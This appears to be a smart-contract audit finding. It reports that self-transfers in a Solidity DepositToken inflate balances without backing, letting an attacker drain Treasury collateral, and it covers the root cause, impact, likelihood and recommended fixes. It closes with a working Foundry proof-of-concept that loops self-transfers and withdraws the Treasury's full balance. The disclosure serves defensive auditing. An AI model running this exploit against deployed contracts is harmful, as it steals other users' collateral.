### Title
Self-transfer inflates `DepositToken` balances and drains Treasury collateral - ([File: contracts/DepositToken.sol](contracts/DepositToken.sol))

### Summary
`DepositToken.transfer()` permits `to_ == msg.sender`. `_transfer()` reads the same storage slot as both sender and recipient, subtracts the amount, then adds the amount back to that same slot, leaving `balance + amount`. Because `totalSupply` is unchanged, each self-transfer mints unbacked deposit-token balance. Repeating the call doubles the attacker’s balance and can inflate it to the Treasury’s full collateral balance. `withdraw()` then burns only the inflated internal balance while `Treasury.pull()` transfers real underlying collateral to the attacker.

### Finding Description
`transfer()` only checks that the requested amount is unlocked and then calls `_transfer()`. [1](#0-0)  `_transfer()` lacks a `sender_ != recipient_` check. [2](#0-1)  When both addresses are identical, the final write sets that one balance slot to `recipientBalance + amount`, creating new spendable balance without increasing `totalSupply` or depositing collateral.

The forged balance is accepted by `withdraw()` because `_revertIfLocked()` compares it to `unlockedBalanceOf()`. [3](#0-2)  `_withdraw()` burns the inflated accounting balance and asks Treasury to release the corresponding real underlying amount. [4](#0-3)  Treasury authorizes the call only by checking that the caller is a registered deposit token, then transfers the underlying. [5](#0-4) 

### Impact Explanation
An unprivileged attacker can start with any nonzero deposit balance, repeatedly call `transfer(attacker, currentBalance)`, exponentially inflate the balance, and withdraw the underlying collateral held in Treasury. This directly steals other users’ collateral because the protocol’s share accounting creates no matching asset deposit and `totalSupply` does not represent the inflated sum of balances.

The attacker can alternatively retain part of the phantom position as collateral, issue synthetic debt through `DebtToken.issue()`, and convert the borrowed synthetic asset through protocol or external markets, leaving bad debt backed by unbacked deposit-token balance.

### Likelihood Explanation
The attack requires only a public ERC-20 call, a small initial deposit, and enough repeated calls to reach the target balance. No privileged role, malicious oracle, malicious bridge endpoint, flash-loan dependency, or specially deployed collateral is required. `withdraw()` is protected by `nonReentrant`, but that guard does not help because the exploit performs multiple completed calls rather than reentering an unfinished call. Pause/shutdown checks and withdrawal fees do not remove the arithmetic flaw.

### Recommendation
Reject self-transfers in `_transfer()` with `if (sender_ == recipient_) revert InvalidTransfer();`, or implement a dedicated no-op balance update plus account-list handling. Ensure sender and recipient balances are resolved before either write, and add invariant tests covering `transfer(self)`, `transferFrom(self, self)`, and liquidation `seize(self, self)` paths. Also add a solvency check that the aggregate minted deposit-token supply corresponds to Treasury collateral backing.

### Proof of Concept
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "forge-std/Test.sol";
import {IERC20} from "../contracts/dependencies/openzeppelin/token/ERC20/IERC20.sol";
import {IDepositToken} from "../contracts/interfaces/IDepositToken.sol";
import {IPool} from "../contracts/interfaces/IPool.sol";

contract DepositTokenSelfTransferTest is Test {
    function testSelfTransferMintsUnbackedBalanceAndDrainsTreasury() public {
        address attacker = makeAddr("attacker");
        IERC20 underlying = IERC20(vm.envAddress("UNDERLYING"));
        IDepositToken depositToken = IDepositToken(vm.envAddress("DEPOSIT_TOKEN"));
        IPool pool = IPool(vm.envAddress("POOL"));
        address treasury = address(pool.treasury());

        uint256 seed = 1e6;
        deal(address(underlying), attacker, seed);

        vm.startPrank(attacker);
        underlying.approve(address(depositToken), seed);
        depositToken.deposit(seed, attacker);

        uint256 treasuryBalance = underlying.balanceOf(treasury);
        assertGt(treasuryBalance, seed);

        while (depositToken.balanceOf(attacker) < treasuryBalance) {
            uint256 current = depositToken.balanceOf(attacker);
            depositToken.transfer(attacker, current);
        }

        (uint256 grossAmount, ) = depositToken.quoteWithdrawIn(treasuryBalance);
        depositToken.withdraw(grossAmount, attacker);
        vm.stopPrank();

        assertEq(underlying.balanceOf(attacker), treasuryBalance);
        assertEq(underlying.balanceOf(treasury), 0);
    }
}
```
